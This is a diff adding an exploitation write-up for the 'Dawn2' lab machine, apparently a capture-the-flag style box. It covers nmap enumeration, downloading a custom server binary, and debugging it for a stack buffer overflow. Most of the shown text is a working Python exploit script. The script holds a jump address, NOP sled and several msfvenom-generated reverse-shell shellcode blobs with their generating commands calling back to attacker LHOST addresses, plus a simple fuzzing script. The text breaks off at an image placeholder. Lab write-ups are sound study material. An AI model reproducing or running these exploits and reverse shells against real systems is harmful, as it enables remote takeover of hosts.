@@ -1,0 +1,309 @@
+# Exploitation Guide for Dawn2
+## Summary
+### This machine is running a couple of servers, both of which are vulnerable to a stack-based buffer overflow that leads to remote code execution. One of the servers is leaked from a website and grants the attacker local privileges on the target. The second server, running as root, is then leaked from the target itself and grants the attacker a root shell when exploited.
+## Enumeration
+
+``` bash
+nmap -sCV -v -T4 -p- <IP> --open
+
+NMAP RESULTS:
+
+PORT     STATE SERVICE   VERSION
+80/tcp   open  http      Apache httpd 2.4.38 ((Debian))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+1435/tcp open  ibm-cics?
+1985/tcp open  hsrp?
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port1435-TCP:V=7.92%I=7%D=7/22%Time=62DAF784%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,4,"\r\n\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port1985-TCP:V=7.92%I=7%D=7/22%Time=62DAF784%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,4,"\r\n\r\n");
+MAC Address: 08:00:27:F2:DF:36 (Oracle VirtualBox virtual NIC)
+
+```
+
+## Web Enumeration Port 80
+Navigating to the default page on port 80 (http://192.168.120.71/) reveals a link to a custom server download: http://192.168.120.71/dawn.zip. 
+We will download it and unzip the contents. Inside are two files: README.txt and dawn.exe. The README file contains the following:
+
+```
+DAWN Multi Server - Version 1.1
+
+Important:
+
+Due the lack of implementation of the Dawn client, many issues may be experienced, such as the message not being delivered. 
+In order to make sure the connection is finished and the message well received, send a NULL-byte at the ending of your message. 
+Also, the service may crash after several requests.
+
+Sorry for the inconvenience!
+```
+
+
+On our machine, we examine the file, learning it is a 32 bit x86 windows executable with Little Endian
+
+```ruby
+
+# file dawn.exe
+dawn.exe: 
+p32 executable (console) Intel 80386, for MS Windows
+
+```
+
+Transfer the dawn.exe file to my homelab Windows 10 vm with Immunity Debugger already installed.
+With python server running on my kali linux machine, complete the transfer by browsing to http://10.0.2.30:8000 and select download.
+
+```bash
+
+┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
+└─# python3 -m http.server  8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.0.2.40 - - [29/Jul/2022 20:54:03] "GET / HTTP/1.1" 200 -
+10.0.2.40 - - [29/Jul/2022 20:54:04] code 404, message File not found
+10.0.2.40 - - [29/Jul/2022 20:54:04] "GET /favicon.ico HTTP/1.1" 404 -
+10.0.2.40 - - [29/Jul/2022 20:54:32] "GET /dawn.exe HTTP/1.1" 200 -
+
+```
+
+```python
+
+#!/usr/bin/python3
+
+import socket,os,sys
+import struct
+#server = "10.0.2.40"   #server where immun debugger is Spidey
+server = "192.168.55.12"   #server where target is PG
+#port = 1985
+port =  1435
+#EIP 345964BA or 34581777(FAILED)
+#offset = 272
+#
+# badchars =b''
+# badchars+=b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+# badchars+=b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+# badchars+=b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+# badchars+=b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+# badchars+=b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+# badchars+=b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+# badchars+=b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+# badchars+=b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+# badchars+=b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+# badchars+=b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+# badchars+=b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+# badchars+=b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+# badchars+=b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+# badchars+=b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+# badchars+=b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+# badchars+=b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+
+
+#windowsx86 rev shell for my machine SUCCESS!
+#msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode
+shellcode =  b""
+shellcode += b"\xdd\xc1\xd9\x74\x24\xf4\xba\x99\xdc\x3b\x2d"
+shellcode += b"\x5e\x31\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc"
+shellcode += b"\x03\xcf\xcf\xd9\xd8\x13\x07\x9f\x23\xeb\xd8"
+shellcode += b"\xc0\xaa\x0e\xe9\xc0\xc9\x5b\x5a\xf1\x9a\x09"
+shellcode += b"\x57\x7a\xce\xb9\xec\x0e\xc7\xce\x45\xa4\x31"
+shellcode += b"\xe1\x56\x95\x02\x60\xd5\xe4\x56\x42\xe4\x26"
+shellcode += b"\xab\x83\x21\x5a\x46\xd1\xfa\x10\xf5\xc5\x8f"
+shellcode += b"\x6d\xc6\x6e\xc3\x60\x4e\x93\x94\x83\x7f\x02"
+shellcode += b"\xae\xdd\x5f\xa5\x63\x56\xd6\xbd\x60\x53\xa0"
+shellcode += b"\x36\x52\x2f\x33\x9e\xaa\xd0\x98\xdf\x02\x23"
+shellcode += b"\xe0\x18\xa4\xdc\x97\x50\xd6\x61\xa0\xa7\xa4"
+shellcode += b"\xbd\x25\x33\x0e\x35\x9d\x9f\xae\x9a\x78\x54"
+shellcode += b"\xbc\x57\x0e\x32\xa1\x66\xc3\x49\xdd\xe3\xe2"
+shellcode += b"\x9d\x57\xb7\xc0\x39\x33\x63\x68\x18\x99\xc2"
+shellcode += b"\x95\x7a\x42\xba\x33\xf1\x6f\xaf\x49\x58\xf8"
+shellcode += b"\x1c\x60\x62\xf8\x0a\xf3\x11\xca\x95\xaf\xbd"
+shellcode += b"\x66\x5d\x76\x3a\x88\x74\xce\xd4\x77\x77\x2f"
+shellcode += b"\xfd\xb3\x23\x7f\x95\x12\x4c\x14\x65\x9a\x99"
+shellcode += b"\xbb\x35\x34\x72\x7c\xe5\xf4\x22\x14\xef\xfa"
+shellcode += b"\x1d\x04\x10\xd1\x35\xaf\xeb\xb2\x33\x30\xf1"
+shellcode += b"\x5c\x2c\x32\xf5\x71\xf0\xbb\x13\x1b\x18\xea"
+shellcode += b"\x8c\xb4\x81\xb7\x46\x24\x4d\x62\x23\x66\xc5"
+shellcode += b"\x81\xd4\x29\x2e\xef\xc6\xde\xde\xba\xb4\x49"
+shellcode += b"\xe0\x10\xd0\x16\x73\xff\x20\x50\x68\xa8\x77"
+shellcode += b"\x35\x5e\xa1\x1d\xab\xf9\x1b\x03\x36\x9f\x64"
+shellcode += b"\x87\xed\x5c\x6a\x06\x63\xd8\x48\x18\xbd\xe1"
+shellcode += b"\xd4\x4c\x11\xb4\x82\x3a\xd7\x6e\x65\x94\x81"
+shellcode += b"\xdd\x2f\x70\x57\x2e\xf0\x06\x58\x7b\x86\xe6"
+shellcode += b"\xe9\xd2\xdf\x19\xc5\xb2\xd7\x62\x3b\x23\x17"
+shellcode += b"\xb9\xff\x43\xfa\x6b\x0a\xec\xa3\xfe\xb7\x71"
+shellcode += b"\x54\xd5\xf4\x8f\xd7\xdf\x84\x6b\xc7\xaa\x81"
+shellcode += b"\x30\x4f\x47\xf8\x29\x3a\x67\xaf\x4a\x6f"
+
+
+#non explicit arch windows rev shell SUCCESS!
+#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode
+# shellcode =  b""
+# shellcode += b"\xb8\xdc\x96\x49\x51\xdb\xde\xd9\x74\x24\xf4"
+# shellcode += b"\x5f\x29\xc9\xb1\x52\x31\x47\x12\x03\x47\x12"
+# shellcode += b"\x83\x1b\x92\xab\xa4\x5f\x73\xa9\x47\x9f\x84"
+# shellcode += b"\xce\xce\x7a\xb5\xce\xb5\x0f\xe6\xfe\xbe\x5d"
+# shellcode += b"\x0b\x74\x92\x75\x98\xf8\x3b\x7a\x29\xb6\x1d"
+# shellcode += b"\xb5\xaa\xeb\x5e\xd4\x28\xf6\xb2\x36\x10\x39"
+# shellcode += b"\xc7\x37\x55\x24\x2a\x65\x0e\x22\x99\x99\x3b"
+# shellcode += b"\x7e\x22\x12\x77\x6e\x22\xc7\xc0\x91\x03\x56"
+# shellcode += b"\x5a\xc8\x83\x59\x8f\x60\x8a\x41\xcc\x4d\x44"
+# shellcode += b"\xfa\x26\x39\x57\x2a\x77\xc2\xf4\x13\xb7\x31"
+# shellcode += b"\x04\x54\x70\xaa\x73\xac\x82\x57\x84\x6b\xf8"
+# shellcode += b"\x83\x01\x6f\x5a\x47\xb1\x4b\x5a\x84\x24\x18"
+# shellcode += b"\x50\x61\x22\x46\x75\x74\xe7\xfd\x81\xfd\x06"
+# shellcode += b"\xd1\x03\x45\x2d\xf5\x48\x1d\x4c\xac\x34\xf0"
+# shellcode += b"\x71\xae\x96\xad\xd7\xa5\x3b\xb9\x65\xe4\x53"
+# shellcode += b"\x0e\x44\x16\xa4\x18\xdf\x65\x96\x87\x4b\xe1"
+# shellcode += b"\x9a\x40\x52\xf6\xdd\x7a\x22\x68\x20\x85\x53"
+# shellcode += b"\xa1\xe7\xd1\x03\xd9\xce\x59\xc8\x19\xee\x8f"
+# shellcode += b"\x5f\x49\x40\x60\x20\x39\x20\xd0\xc8\x53\xaf"
+# shellcode += b"\x0f\xe8\x5c\x65\x38\x83\xa7\xee\x4d\x54\xa5"
+# shellcode += b"\xf0\x39\x56\xa9\x1d\xe6\xdf\x4f\x77\x06\xb6"
+# shellcode += b"\xd8\xe0\xbf\x93\x92\x91\x40\x0e\xdf\x92\xcb"
+# shellcode += b"\xbd\x20\x5c\x3c\xcb\x32\x09\xcc\x86\x68\x9c"
+# shellcode += b"\xd3\x3c\x04\x42\x41\xdb\xd4\x0d\x7a\x74\x83"
+# shellcode += b"\x5a\x4c\x8d\x41\x77\xf7\x27\x77\x8a\x61\x0f"
+# shellcode += b"\x33\x51\x52\x8e\xba\x14\xee\xb4\xac\xe0\xef"
+# shellcode += b"\xf0\x98\xbc\xb9\xae\x76\x7b\x10\x01\x20\xd5"
+# shellcode += b"\xcf\xcb\xa4\xa0\x23\xcc\xb2\xac\x69\xba\x5a"
+# shellcode += b"\x1c\xc4\xfb\x65\x91\x80\x0b\x1e\xcf\x30\xf3"
+# shellcode += b"\xf5\x4b\x50\x16\xdf\xa1\xf9\x8f\x8a\x0b\x64"
+# shellcode += b"\x30\x61\x4f\x91\xb3\x83\x30\x66\xab\xe6\x35"
+# shellcode += b"\x22\x6b\x1b\x44\x3b\x1e\x1b\xfb\x3c\x0b"
+
+#linux rev shell SUCCESS!
+#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.117 LPORT=4444 -f py -b "\x00" -v shellcode
+# shellcode =  b""
+# shellcode += b"\xda\xc6\xd9\x74\x24\xf4\xbd\x8c\x76\xb7\x82"
+# shellcode += b"\x5e\x31\xc9\xb1\x12\x31\x6e\x17\x03\x6e\x17"
+# shellcode += b"\x83\x4a\x72\x55\x77\x63\xa0\x6e\x9b\xd0\x15"
+# shellcode += b"\xc2\x36\xd4\x10\x05\x76\xbe\xef\x46\xe4\x67"
+# shellcode += b"\x40\x79\xc6\x17\xe9\xff\x21\x7f\x2a\x57\xe0"
+# shellcode += b"\x0a\xc2\xaa\x03\xe5\x4e\x22\xe2\xb5\x09\x64"
+# shellcode += b"\xb4\xe6\x66\x87\xbf\xe9\x44\x08\xed\x81\x38"
+# shellcode += b"\x26\x61\x39\xad\x17\xaa\xdb\x44\xe1\x57\x49"
+# shellcode += b"\xc4\x78\x76\xdd\xe1\xb7\xf9"
+
+#dawn-BETA.exe linux PG target
+shellcode =  b""
+shellcode += b"\xb8\x18\x31\x0c\x19\xda\xce\xd9\x74\x24\xf4"
+shellcode += b"\x5b\x2b\xc9\xb1\x12\x31\x43\x12\x03\x43\x12"
+shellcode += b"\x83\xf3\xcd\xee\xec\x32\xf5\x18\xed\x67\x4a"
+shellcode += b"\xb4\x98\x85\xc5\xdb\xed\xef\x18\x9b\x9d\xb6"
+shellcode += b"\x12\xa3\x6c\xc8\x1a\xa5\x97\xa0\x5c\xfd\x59"
+shellcode += b"\x07\x35\xfc\x99\x76\x99\x89\x7b\xc8\x47\xda"
+shellcode += b"\x2a\x7b\x3b\xd9\x45\x9a\xf6\x5e\x07\x34\x67"
+shellcode += b"\x70\xdb\xac\x1f\xa1\x34\x4e\x89\x34\xa9\xdc"
+shellcode += b"\x1a\xce\xcf\x50\x97\x1d\x8f"
+
+#SUCCESS!
+#linux rev shell with common badchars  NOTICE! single quotes required for parsing multiple bad chars
+#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.117 LPORT=4444 -f py -b '\x00\x0a\x0d\xff' -v shellcode
+# shellcode =  b""
+# shellcode += b"\xdb\xd4\xb8\x61\xc3\xdb\xdd\xd9\x74\x24\xf4"
+# shellcode += b"\x5d\x2b\xc9\xb1\x12\x31\x45\x17\x03\x45\x17"
+# shellcode += b"\x83\x8c\x3f\x39\x28\x7f\x1b\x49\x30\x2c\xd8"
+# shellcode += b"\xe5\xdd\xd0\x57\xe8\x92\xb2\xaa\x6b\x41\x63"
+# shellcode += b"\x85\x53\xab\x13\xac\xd2\xca\x7b\xef\x8d\x1c"
+# shellcode += b"\x0e\x87\xcf\x5e\xe1\x0b\x59\xbf\xb1\xd2\x09"
+# shellcode += b"\x11\xe2\xa9\xa9\x18\xe5\x03\x2d\x48\x8d\xf5"
+# shellcode += b"\x01\x1e\x25\x62\x71\xcf\xd7\x1b\x04\xec\x45"
+# shellcode += b"\x8f\x9f\x12\xd9\x24\x6d\x54"
+
+#2stage windows/shell/reverse_tcp rev shell FAILED
+#2stage windowws/shell/reverse_tcp explicit arch FAILED
+
+#jump address !mona jmp -r esp = 0x345964ba
+#calc.exe test
+#msfvenom -p windows/exec -a x86 CMD=calc.exe -b "\x00" -f py -v shellcode
+# shellcode =  b""
+# shellcode += b"\xdd\xc1\xba\x65\xdc\xf0\xc2\xd9\x74\x24\xf4"
+# shellcode += b"\x5b\x2b\xc9\xb1\x31\x83\xc3\x04\x31\x53\x14"
+# shellcode += b"\x03\x53\x71\x3e\x05\x3e\x91\x3c\xe6\xbf\x61"
+# shellcode += b"\x21\x6e\x5a\x50\x61\x14\x2e\xc2\x51\x5e\x62"
+# shellcode += b"\xee\x1a\x32\x97\x65\x6e\x9b\x98\xce\xc5\xfd"
+# shellcode += b"\x97\xcf\x76\x3d\xb9\x53\x85\x12\x19\x6a\x46"
+# shellcode += b"\x67\x58\xab\xbb\x8a\x08\x64\xb7\x39\xbd\x01"
+# shellcode += b"\x8d\x81\x36\x59\x03\x82\xab\x29\x22\xa3\x7d"
+# shellcode += b"\x22\x7d\x63\x7f\xe7\xf5\x2a\x67\xe4\x30\xe4"
+# shellcode += b"\x1c\xde\xcf\xf7\xf4\x2f\x2f\x5b\x39\x80\xc2"
+# shellcode += b"\xa5\x7d\x26\x3d\xd0\x77\x55\xc0\xe3\x43\x24"
+# shellcode += b"\x1e\x61\x50\x8e\xd5\xd1\xbc\x2f\x39\x87\x37"
+# shellcode += b"\x23\xf6\xc3\x10\x27\x09\x07\x2b\x53\x82\xa6"
+# shellcode += b"\xfc\xd2\xd0\x8c\xd8\xbf\x83\xad\x79\x65\x65"
+# shellcode += b"\xd1\x9a\xc6\xda\x77\xd0\xea\x0f\x0a\xbb\x60"
+# shellcode += b"\xd1\x98\xc1\xc6\xd1\xa2\xc9\x76\xba\x93\x42"
+# shellcode += b"\x19\xbd\x2b\x81\x5e\x31\x66\x88\xf6\xda\x2f"
+# shellcode += b"\x58\x4b\x87\xcf\xb6\x8f\xbe\x53\x33\x6f\x45"
+# shellcode += b"\x4b\x36\x6a\x01\xcb\xaa\x06\x1a\xbe\xcc\xb5"
+# shellcode += b"\x1b\xeb\xae\x58\x88\x77\x1f\xff\x28\x1d\x5f"
+
+
+
+As = b'A'
+Bs = b'B' * 4
+NOP = b'\x90' *16
+nullbyte = b'\x00'
+Cs = b'C' * 400     #room for evil
+#jmp_add = b'\xba\x64\x59\x34'  #reverse for little Endian (call esp)
+jmp_add = b'\x13\x15\x50\x52'
+#unique = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9'
+#unique = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'
+#payload = As * offset + jmp_add + NOP + shellcode+ NOP+ nullbyte
+payload = As * 13 + jmp_add + NOP + shellcode + nullbyte
+
+
+
+
+
+print(payload)
+
+def main():
+    print(len(sys.argv))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(payload)
+    s.close()
+    print("[+] payload sent.")
+    
+if __name__ == "__main__":
+    main()    
+```
+
+
+
+```python
+
+#!/usr/bin/python3
+
+import socket,os,sys
+server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+port = 1985
+
+As = b'A'
+nullbyte = b'\x00'
+payload = As * 500 + nullbyte
+
+
+print(payload)
+
+def main():
+    print(len(sys.argv))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(payload)
+    s.close()
+    print("[+] payload sent.")
+    
+if __name__ == "__main__":
+    main()    
+    
+```    
+
+With Immunity Debugger run as Administrator on the Windows vm, we run the python script above, sending 500 byte encoded A's 
+and end it with a nullbyte as instructed by the message we found earlier.
+
+![test1]( )
